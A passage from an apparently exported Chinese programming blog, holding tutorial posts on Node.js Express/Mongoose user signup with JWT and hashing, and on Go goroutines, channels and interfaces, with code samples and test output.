=&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 123456789101112131415161718192021221、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/usersBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian05@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe6fd7363da36a46a2add5&quot;, &quot;email&quot;: &quot;zhuimengshaonian05@gmail.com&quot;, &quot;password&quot;: &quot;123abc!&quot;, &quot;tokens&quot;: [ &#123; &quot;_id&quot;: &quot;5bfe6fd7363da36a46a2add6&quot;, &quot;access&quot;: &quot;auth&quot;, &quot;token&quot;: &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNmZkNzM2M2RhMzZhNDZhMmFkZDUiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxNDMxfQ.uBCgcUymEQLY0l5rusBHESLZb23xsrxDD3XwXUn4kNQ&quot; &#125; ], &quot;__v&quot;: 1&#125; 重写toJSON方法 重写后，对象转换为json的方法，只会返回id和email。而不会返回token。 123456UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;; 测试2 123456789101112131415161、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/usersBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[23]-hash函数","slug":"node-23-hash","date":"2018-11-28T09:29:16.000Z","updated":"2018-11-29T03:14:56.578Z","comments":true,"path":"2018/11/28/node-23-hash/","link":"","permalink":"https://dreamerjonson.com/2018/11/28/node-23-hash/","excerpt":"","text":"加密库 1npm install --save crypto-js 使用hash函数 123456const &#123;SHA256&#125; = require('crypto-js');var message = 'I am user number 3';var hash = SHA256(message).toString();console.log(`Message: $&#123;message&#125;`);console.log(`Hash: $&#123;hash&#125;`); 返回值： 12Message: I am user number 3Hash: 9da4d19e100809d42da806c2b7df5cf37e72623d42f1669eb112e23f5c9d45a3 利用哈希模拟数据的加密解密 12345678910111213141516const &#123;SHA256&#125; = require('crypto-js');var data = &#123; id: 4&#125;;var token = &#123; data, hash: SHA256(JSON.stringify(data) + 'somesecret').toString() // 密码+data 并hash&#125;//如果data和密码都是正确的，那么数据没有被修改过。否则数据被修改。var resultHash = SHA256(JSON.stringify(token.data) + 'somesecret').toString();if (resultHash === token.hash) &#123; console.log('Data was not changed');&#125; else &#123; console.log('Data was changed. Do not trust!');&#125; jsonwebtoken进行数据的加密解密 123456789101112const &#123;SHA256&#125; = require('crypto-js');const jwt = require('jsonwebtoken');var data = &#123; id: 10&#125;;var token = jwt.sign(data, '123abc'); //加密console.log(token);var decoded = jwt.verify(token, '123abc'); //解密console.log('decoded', decoded); 123返回值eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsImlhdCI6MTU0MzM5NzgwMn0.TMQoQEsCuUptXkix0-vYCN5FGJnynj7tSSeMda33giAdecoded &#123; id: 10, iat: 1543397802 &#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[22]-express+mongoDB+mongoose验证","slug":"node-22-mongoose-validate","date":"2018-11-28T08:46:07.000Z","updated":"2018-11-29T03:14:45.230Z","comments":true,"path":"2018/11/28/node-22-mongoose-validate/","link":"","permalink":"https://dreamerjonson.com/2018/11/28/node-22-mongoose-validate/","excerpt":"","text":"安装 validator 1&gt; npm install --save validators user-model 123456789101112131415161718192021222324252627282930313233343536var User = mongoose.model('User', &#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; //验证 validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);// &#123;// email: 'andrew@example.com',// password: 'adpsofijasdfmpoijwerew',// tokens: [&#123;// access: 'auth',// token: 'poijasdpfoimasdpfjiweproijwer'// &#125;]// &#125; express保存user 1234567891011// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then((user) =&gt; &#123; res.send(user); &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;); 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//Promisemongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);var User = mongoose.model('User', &#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);// &#123;// email: 'andrew@example.com',// password: 'adpsofijasdfmpoijwerew',// tokens: [&#123;// access: 'auth',// token: 'poijasdpfoimasdpfjiweproijwer'// &#125;]// &#125;//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then((user) =&gt; &#123; res.send(user); &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 123456789101112131415161、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/usersBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe54f072e64d6885bf4b2c&quot;, &quot;email&quot;: &quot;zhuimengshaonian@gmail.com&quot;, &quot;password&quot;: &quot;123abc!&quot;, &quot;tokens&quot;: [], &quot;__v&quot;: 0&#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"golang语言渐入佳境[20]-协程与通道","slug":"golang-20-channel","date":"2018-11-27T14:08:15.000Z","updated":"2018-11-28T08:28:34.437Z","comments":true,"path":"2018/11/27/golang-20-channel/","link":"","permalink":"https://dreamerjonson.com/2018/11/27/golang-20-channel/","excerpt":"","text":"协程引入 通过状态检查器checkLink，不断的获取切片当中的网址，并且打印了出来。 顺序执行。这也就意味着，一旦我访问google.com等网站就会陷入到等待的状况中。后面的网址无法访问。 123456789101112131415161718192021222324252627282930313233package mainimport ( \"net/http\" \"fmt\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; for _,link := range links&#123; checkLink(link) &#125;&#125;func checkLink(link string)&#123; _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") return &#125; fmt.Println(link,\"连接上了\")&#125; go的协程 在函数的前方，加入go关键字，代表开辟一个新的协程。 运行一个go语言的程序的时候，都会开辟一个main协程。子协程通过go的关键字来创建。 通过Go的调度器，会将go的协程分配给CPU core取执行。当某一个子协程陷入了暂停或结束，Go的调度器会立即切换到其他的协程工作。因此大大的提高了效率。 但是当前的程序，直接退出了。因为main协程终止以后，子协程全部都会被销毁。 123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;net/http&quot; &quot;fmt&quot;)func main()&#123; links := []string&#123; &quot;http://www.baidu.com&quot;, &quot;http://www.jd.com&quot;, &quot;http://www.taobao.com&quot;, &quot;http://www.163.com&quot;, &quot;http://www.sohu.com&quot;, &#125; for _,link := range links&#123; go checkLink(link) &#125;//main协程终止以后，子协程全部都会被销毁&#125;func checkLink(link string)&#123; _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,&quot;没有连接上&quot;) return &#125; fmt.Println(link,&quot;连接上了&quot;)&#125; channel通道 通道就是实现协程之间的通信。 通道的创建 c:= make(chan string) 代表创建了一个通道，此通道只能够传递字符串类型。 通道实例 1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( \"net/http\" \"fmt\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; c:= make(chan string) for _,link := range links&#123; go checkLink(link,c) &#125; fmt.Println(&lt;-c) //等待通道的消息并打印，但是这里只是等待了一条通道。&#125;func checkLink(link string,c chan string)&#123; //通道的参数 _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") c&lt;-\"没有连接上\" //为通道传递消息 return &#125; fmt.Println(link,\"连接上了\") c&lt;-\"连接上了\"//为通道传递消息&#125; 执行结果 12http://www.baidu.com 连接上了连接上了 上面的代码输出的结果为： 意味着百度连接上之后就退出了。这是由于主协程fmt.Println(&lt;-c)陷入等待，当百度的子协程运行完毕，为通道添加信息之后。那么主协程退出，但是其他的协程还没有运行完毕。但是会直接销毁。 通道等待 如果想要全部打印出来，增加了多个等待通道的指令。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package mainimport ( \"net/http\" \"fmt\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; c:= make(chan string) for _,link := range links&#123; go checkLink(link,c) &#125; // fmt.Println(&lt;-c) // fmt.Println(&lt;-c) // fmt.Println(&lt;-c) // fmt.Println(&lt;-c) // fmt.Println(&lt;-c) // fmt.Println(&lt;-c) for i:=0;i&lt;len(links);i++&#123; //等待所有的结果。 fmt.Println(&lt;-c) &#125;&#125;func checkLink(link string,c chan string)&#123; _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") c&lt;-\"没有连接上\" return &#125; fmt.Println(link,\"连接上了\") c&lt;-\"连接上了\"&#125; 执行结果 12345678910http://www.baidu.com 连接上了连接上了http://www.163.com 连接上了连接上了http://www.taobao.com 连接上了连接上了http://www.sohu.com 连接上了连接上了http://www.jd.com 连接上了连接上了 并不是顺序执行的。 通道无限循环 1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( \"net/http\" \"fmt\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; c:= make(chan string) for _,link := range links&#123; go checkLink(link,c) &#125; for&#123; go checkLink(&lt;-c,c) //一旦接收到通道的信息，就再次的创建协程，将链接作为第一个参数。 &#125;&#125;func checkLink(link string,c chan string)&#123; _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") c&lt;-link //将链接放置到通道中 return &#125; fmt.Println(link,\"连接上了\") c&lt;-link //将链接放置到通道中&#125; go的通道遍历 比上一个代码效果一样，更加的清晰 1234567891011121314151617181920212223242526272829303132333435363738394041424344package mainimport ( \"net/http\" \"fmt\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; c:= make(chan string) for _,link := range links&#123; go checkLink(link,c) &#125; //for&#123; // go checkLink(&lt;-c,c) //&#125; for l:=range c&#123; go checkLink(l,c) &#125;&#125;func checkLink(link string,c chan string)&#123; time.Sleep(2*time.Second) //等待两秒钟 _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") c&lt;-link return &#125; fmt.Println(link,\"连接上了\") c&lt;-link&#125; 高级写法的错误代码 下面的代码有一个非常严重的问题， 123456789101112131415161718192021222324252627282930313233343536373839package mainimport ( \"net/http\" \"fmt\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; c:= make(chan string) for _,link := range links&#123; go checkLink(link,c) &#125;//下面的代码有一个非常严重的问题，当等待2秒钟之后，l这个地址的字符串全部变为了相同的了。并传递到了所有的协程中。 for l:=range c&#123; go func() &#123; time.Sleep(2*time.Second) checkLink(l,c) &#125;() &#125;&#125;func checkLink(link string,c chan string)&#123; _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") c&lt;-link return &#125; fmt.Println(link,\"连接上了\") c&lt;-link&#125; 更高级的正确写法 上面写法的改进，不再是引用，而是每一个副本。传递到函数中。 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( \"net/http\" \"fmt\" \"time\")func main()&#123; links := []string&#123; \"http://www.baidu.com\", \"http://www.jd.com\", \"http://www.taobao.com\", \"http://www.163.com\", \"http://www.sohu.com\", &#125; c:= make(chan string) for _,link := range links&#123; go checkLink(link,c) &#125;//无限遍历通道。 匿名函数的方式 for l:=range c&#123; go func(link string) &#123; //上面写法的改进，不再是引用，而是每一个副本。首先传递到函数中。 time.Sleep(2*time.Second) checkLink(link,c) &#125;(l) &#125;&#125;func checkLink(link string,c chan string)&#123; _,err := http.Get(link) if err !=nil&#123; fmt.Printf(link,\"没有连接上\") c&lt;-link return &#125; fmt.Println(link,\"连接上了\") c&lt;-link&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[19]-从go源代码读懂interface接口","slug":"golang-19-source-interface","date":"2018-11-27T13:36:54.000Z","updated":"2018-11-27T15:30:15.867Z","comments":true,"path":"2018/11/27/golang-19-source-interface/","link":"","permalink":"https://dreamerjonson.com/2018/11/27/golang-19-source-interface/","excerpt":"","text":"go源代码中的接口 http库中，get方法： 1func Get(url string) (resp *Response, err error) Response: 123456789type Response struct &#123; Status string // e.g. &quot;200 OK&quot; StatusCode int // e.g. 200 Proto string // e.g. &quot;HTTP/1.0&quot; ProtoMajor int // e.g. 1 ProtoMinor int // e.g. 0 Header Header Body io.ReadCloser io.ReadCloser: 1234type ReadCloser interface &#123; Reader Closer&#125; Reader: 123type Reader interface &#123; Read(p []byte) (n int, err error)&#125; Closer: 123type Closer interface &#123; Close() error&#125; 不管是读取文件、网络等操作，都实现了相同的Reader接口。当传递[]byte进去，会将读取到的byte放置进去。成功会返回成功的个数。 123456789101112131415161718192021package mainimport ( \"net/http\" \"fmt\" \"os\")func main()&#123; resp,err := http.Get(\"http://tmall.com\") if err !=nil&#123; fmt.Println(\"Error:\",err) os.Exit(1) &#125; //设置大一点，read方法不会自动的扩容。 bs:=make([]byte,99999) //read函数将读取到的数据放入到bs中。 resp.Body.Read(bs) fmt.Println(string(bs))&#125; write接口 123type Writer interface &#123; Write(p []byte) (n int, err error)&#125; io.opy 1234567891011121314151617181920package mainimport ( \"net/http\" \"fmt\" \"os\" \"io\")func main()&#123; resp,err := http.Get(\"http://tmall.com\") if err !=nil&#123; fmt.Println(\"Error:\",err) os.Exit(1) &#125; //读取resp.Body中的信息，写到os.Stdout中。os.Stdout实现了write接口，resp.Body实现了read接口。 io.Copy(os.Stdout,resp.Body)&#125; io.copy源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758func Copy(dst Writer, src Reader) (written int64, err error) &#123; return copyBuffer(dst, src, nil)&#125;---------func CopyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) &#123; if buf != nil &amp;&amp; len(buf) == 0 &#123; panic(\"empty buffer in io.CopyBuffer\") &#125; return copyBuffer(dst, src, buf)&#125;---------func copyBuffer(dst Writer, src Reader, buf []byte) (written int64, err error) &#123; // If the reader has a WriteTo method, use it to do the copy. // Avoids an allocation and a copy. if wt, ok := src.(WriterTo); ok &#123; return wt.WriteTo(dst) &#125; // Similarly, if the writer has a ReadFrom method, use it to do the copy. if rt, ok := dst.(ReaderFrom); ok &#123; return rt.ReadFrom(src) &#125; size := 32 * 1024 if l, ok := src.(*LimitedReader); ok &amp;&amp; int64(size) &gt; l.N &#123; if l.N &lt; 1 &#123; size = 1 &#125; else &#123; size = int(l.N) &#125; &#125; if buf == nil &#123; buf = make([]byte, size)//分配 &#125; for &#123; //疯狂读取并写入 nr, er := src.Read(buf) if nr &gt; 0 &#123; nw, ew := dst.Write(buf[0:nr]) if nw &gt; 0 &#123; written += int64(nw) &#125; if ew != nil &#123; err = ew break &#125; if nr != nw &#123; err = ErrShortWrite break &#125; &#125; if er != nil &#123; if er != EOF &#123; err = er &#125; break &#125; &#125; return written, err&#125; 自定义Writer函数 12345678910111213141516171819202122232425262728293031package mainimport ( \"net/http\" \"fmt\" \"os\" \"io\")type logWriter struct&#123;&#125;func main()&#123; resp,err := http.Get(\"http://tmall.com\") if err !=nil&#123; fmt.Println(\"Error:\",err) os.Exit(1) &#125; lw:= logWriter&#123;&#125; //读取resp.Body中的信息，写到os.Stdout中。os.Stdout实现了write接口，resp.Body实现了read接口。 io.Copy(lw,resp.Body)&#125;func (logWriter) Write(bs []byte)(int,error)&#123; fmt.Println(string(bs)) fmt.Println(\"Just wrote this many bytes\",len(bs)) return len(bs),nil&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[18]-interface接口","slug":"golang-18-interface","date":"2018-11-27T09:54:19.000Z","updated":"2019-02-23T15:27:16.200Z","comments":true,"path":"2018/11/27/golang-18-interface/","link":"","permalink":"https://dreamerjonson.com/2018/11/27/golang-18-interface/","excerpt":"","text":"interface接口 接口类型是对其它类型行为的抽象和概括；因为接口类型不会和特定的实现细节绑定在一起，通过这种抽象的方式我们可以让我们的函数更加灵活和更具有适应能力。 很多面向对象的语言都有相似的接口概念，但Go语言中接口类型的独特之处在于它是满足隐式实现的。也就是说，我们没有必要对于给定的具体类型定义所有满足的接口类型；简单地拥有一些必需的方法就足够了。这种设计可以让你创建一个新的接口类型满足已经存在的具体类型却不会去改变这些类型的定义；当我们使用的类型来自于不受我们控制的包时这种设计尤其有用。 在本章，我们会开始看到接口类型和值的一些基本技巧。顺着这种方式我们将学习几个来自标准库的重要接口。很多Go程序中都尽可能多的去使用标准库中的接口。 目前为止，我们看到的类型都是具体的类型。一个具体的类型可以准确的描述它所代表的值并且展示出对类型本身的一些操作方式就像数字类型的算术操作，切片类型的索引、附加和取范围操作。具体的类型还可以通过它的方法提供额外的行为操作。总的来说，当你拿到一个具体的类型时你就知道它的本身是什么和你可以用它来做什么。 在Go语言中还存在着另外一种类型：接口类型。接口类型是一种抽象的类型。它不会暴露出它所代表的对象的内部值的结构和这个对象支持的基础操作的集合；它们只会展示出它们自己的方法。也就是说当你有看到一个接口类型的值时，你不知道它是什么，唯一知道的就是可以通过它的方法来做什么。 在本书中，我们一直使用两个相似的函数来进行字符串的格式化：fmt.Printf它会把结果写到标准输出和fmt.Sprintf它会把结果以字符串的形式返回。得益于使用接口，我们不必可悲的因为返回结果在使用方式上的一些浅显不同就必需把格式化这个最困难的过程复制一份。实际上，这两个函数都使用了另一个函数fmt.Fprintf来进行封装。fmt.Fprintf这个函数对它的计算结果会被怎么使用是完全不知道的。 12345678910package fmtfunc Fprintf(w io.Writer, format string, args ...interface&#123;&#125;) (int, error)func Printf(format string, args ...interface&#123;&#125;) (int, error) &#123; return Fprintf(os.Stdout, format, args...)&#125;func Sprintf(format string, args ...interface&#123;&#125;) string &#123; var buf bytes.Buffer Fprintf(&amp;buf, format, args...) return buf.String()&#125; Fprintf的前缀F表示文件(File)也表明格式化输出结果应该被写入第一个参数提供的文件中。在Printf函数中的第一个参数os.Stdout是*os.File类型；在Sprintf函数中的第一个参数&amp;buf是一个指向可以写入字节的内存缓冲区，然而它并不是一个文件类型尽管它在某种意义上和文件类型相似。 卽使Fprintf函数中的第一个参数也不是一个文件类型。它是io.Writer类型这是一个接口类型定义如下： 123456789101112package io// Writer is the interface that wraps the basic Write method.type Writer interface &#123; // Write writes len(p) bytes from p to the underlying data stream. // It returns the number of bytes written from p (0 &lt;= n &lt;= len(p)) // and any error encountered that caused the write to stop early. // Write must return a non-nil error if it returns n &lt; len(p). // Write must not modify the slice data, even temporarily. // // Implementations must not retain p. Write(p []byte) (n int, err error)&#125; io.Writer类型定义了函数Fprintf和这个函数调用者之间的约定。一方面这个约定需要调用者提供具体类型的值就像os.File和bytes.Buffer，这些类型都有一个特定签名和行为的Write的函数。另一方面这个约定保证了Fprintf接受任何满足io.Writer接口的值都可以工作。Fprintf函数可能没有假定写入的是一个文件或是一段内存，而是写入一个可以调用Write函数的值。 因为fmt.Fprintf函数没有对具体操作的值做任何假设而是仅仅通过io.Writer接口的约定来保证行为，所以第一个参数可以安全地传入一个任何具体类型的值只需要满足io.Writer接口。一个类型可以自由的使用另一个满足相同接口的类型来进行替换被称作可替换性(LSP里氏替换)。这是一个面向对象的特征。 让我们通过一个新的类型来进行校验，下面ByteCounter类型里的Write方法，仅仅在丢失写向它的字节前统计它们的长度。(在这个+=赋值语句中，让len§的类型和c的类型匹配的转换是必须的。) 12345678910111213type ByteCounter intfunc (c *ByteCounter) Write(p []byte) (int, error) &#123; *c += ByteCounter(len(p)) // convert int to ByteCounter return len(p), nil&#125;因为*ByteCounter满足io.Writer的约定，我们可以把它传入Fprintf函数中；Fprintf函数执行字符串格式化的过程不会去关注ByteCounter正确的累加结果的长度。var c ByteCounterc.Write([]byte(&quot;hello&quot;))fmt.Println(c) // &quot;5&quot;, = len(&quot;hello&quot;)c = 0 // reset the countervar name = &quot;Dolly&quot;fmt.Fprintf(&amp;c, &quot;hello, %s&quot;, name)fmt.Println(c) // &quot;12&quot;, = len(&quot;hello, Dolly&quot;) 除了io.Writer这个接口类型，还有另一个对fmt包很重要的接口类型。Fprintf和Fprintln函数向类型提供了一种控制它们值输出的途径。在2.5节中，我们为Celsius类型提供了一个String方法以便于可以打印成这样&quot;100°C&quot; ，在6.5节中我们给*IntSet添加一个String方法，这样集合可以用传统的符号来进行表示就像&quot;{1 2 3}&quot;。给一个类型定义String方法，可以让它满足最广泛使用之一的接口类型fmt.Stringer： 1234567package fmt// The String method is used to print values passed// as an operand to any format that accepts a string// or to an unformatted printer such as Print.type Stringer interface &#123; String() string&#125; 接口类型 12345678910111213141516171819202122232425262728293031接口类型具体描述了一系列方法的集合，一个实现了这些方法的具体类型是这个接口类型的实例。io.Writer类型是用的最广泛的接口之一，因为它提供了所有的类型写入bytes的抽象，包括文件类型，内存缓冲区，网络链接，HTTP客户端，压缩工具，哈希等等。io包中定义了很多其它有用的接口类型。Reader可以代表任意可以读取bytes的类型，Closer可以是任意可以关闭的值，例如一个文件或是网络链接。（到现在你可能注意到了很多Go语言中单方法接口的命名习惯）package iotype Reader interface &#123; Read(p []byte) (n int, err error)&#125;type Closer interface &#123; Close() error&#125;在往下看，我们发现有些新的接口类型通过组合已经有的接口来定义。下面是两个例子：type ReadWriter interface &#123; Reader Writer&#125;type ReadWriteCloser interface &#123; Reader Writer Closer&#125;上面用到的语法和结构内嵌相似，我们可以用这种方式以一个简写命名另一个接口，而不用声明它所有的方法。这种方式本称为接口内嵌。尽管略失简洁，我们可以像下面这样，不使用内嵌来声明io.Writer接口。type ReadWriter interface &#123; Read(p []byte) (n int, err error) Write(p []byte) (n int, err error)&#125;或者甚至使用种混合的风格：type ReadWriter interface &#123; Read(p []byte) (n int, err error) Writer&#125;上面3种定义方式都是一样的效果。方法的顺序变化也没有影响，唯一重要的就是这个集合里面的方法。 接口声明与定义 interface关键字，在接口中有函数，但是没有实现。 123type Phone interface &#123; call()&#125; 例子 一旦有结构体实现了此函数，那么就可以用接口来接收此结构体。 1234567891011121314151617181920212223242526272829303132333435package mainimport \"fmt\"type Phone interface &#123; call()&#125;type AndroidPhone struct &#123;&#125;type IPhone struct &#123;&#125;func (a AndroidPhone) call() &#123; fmt.Println(\"我是安卓手机，可以打电话了\")&#125;func (i IPhone) call() &#123; fmt.Println(\"我是苹果手机，可以打电话了\")&#125;func main() &#123; // 定义接口类型的变量 var phone Phone phone = new(AndroidPhone) phone = AndroidPhone&#123;&#125; fmt.Printf(\"%T , %v , %p \\n\" , phone , phone , &amp;phone) phone.call() phone = new(IPhone) phone = IPhone&#123;&#125; fmt.Printf(\"%T , %v , %p \\n\" , phone , phone , 